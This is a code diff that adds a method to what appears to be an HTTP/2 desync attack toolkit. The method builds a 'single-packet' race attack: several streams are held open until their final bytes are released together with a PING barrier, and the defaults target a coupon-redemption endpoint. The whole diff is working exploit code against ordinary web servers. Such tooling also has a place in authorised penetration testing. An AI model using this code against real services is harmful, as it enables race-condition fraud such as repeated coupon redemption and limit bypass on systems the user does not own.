@@ -352,3 +352,74 @@ class H2GatewayDesyncBuilder:
             stream_id=0,
             payload=opaque_data[:8].ljust(8, b"\x00"),
         ).serialize()
+
+    @classmethod
+    def build_single_packet_race_frames(
+        cls,
+        path: str = "/api/redeem",
+        host: str = "target.local",
+        num_streams: int = 5,
+        payload: bytes = b"coupon=RACE1",
+        method: str = "POST",
+        scheme: str = "https",
+        extra_headers: Optional[Dict[str, str]] = None,
+    ) -> Tuple[bytes, bytes, List[int]]:
+        """
+        HTTP/2 Single-Packet Multi-Stream Race Synchronizer (Last-Byte Barrier):
+        Constructs `N` odd-numbered concurrent HTTP/2 streams (1, 3, 5, ..., 2N-1):
+          1. `prefix_batch_bytes`: Connection preface + SETTINGS + for every stream `s_i`,
+             its `HEADERS (END_HEADERS)` frame and initial `DATA (flags=0)` frame containing
+             `payload[:-1]`, leaving all `N` streams open waiting for their final byte.
+          2. `final_last_byte_batch_bytes`: Coalesced batch of `N` 1-byte `DATA (END_STREAM)`
+             frames (`payload[-1:]`) across all `N` streams, plus a trailing `PING` barrier frame,
+             designed to be flushed in a single `TCP_NODELAY` `sendall()` packet.
+        Returns `(prefix_batch_bytes, final_last_byte_batch_bytes, stream_ids)`.
+        """
+        n_count = max(2, min(32, int(num_streams)))
+        body_bytes = bytes(payload) if payload else b"X"
+        prefix_body = body_bytes[:-1]
+        last_byte = body_bytes[-1:]
+
+        prefix_buf = bytearray(cls.build_client_init_stream())
+        last_byte_buf = bytearray()
+        stream_ids: List[int] = []
+
+        for idx in range(n_count):
+            sid = 1 + (idx * 2)
+            stream_ids.append(sid)
+            headers = [
+                (":method", method.upper()),
+                (":scheme", scheme),
+                (":authority", host),
+                (":path", path),
+                ("content-length", str(len(body_bytes))),
+            ]
+            for hk, hv in (extra_headers or {}).items():
+                headers.append((str(hk).lower(), str(hv)))
+            hdr_block = HPACKLite.encode_headers_block(headers)
+            hdr_frame = H2Frame(
+                frame_type=H2FrameType.HEADERS,
+                flags=H2Flag.END_HEADERS,
+                stream_id=sid,
+                payload=hdr_block,
+            )
+            prefix_buf.extend(hdr_frame.serialize())
+            if prefix_body:
+                partial_data = H2Frame(
+                    frame_type=H2FrameType.DATA,
+                    flags=H2Flag.NONE,
+                    stream_id=sid,
+                    payload=prefix_body,
+                )
+                prefix_buf.extend(partial_data.serialize())
+
+            final_data = H2Frame(
+                frame_type=H2FrameType.DATA,
+                flags=H2Flag.END_STREAM,
+                stream_id=sid,
+                payload=last_byte,
+            )
+            last_byte_buf.extend(final_data.serialize())
+
+        last_byte_buf.extend(cls.build_h2_ping(b"RACEBARR"))
+        return bytes(prefix_buf), bytes(last_byte_buf), stream_ids
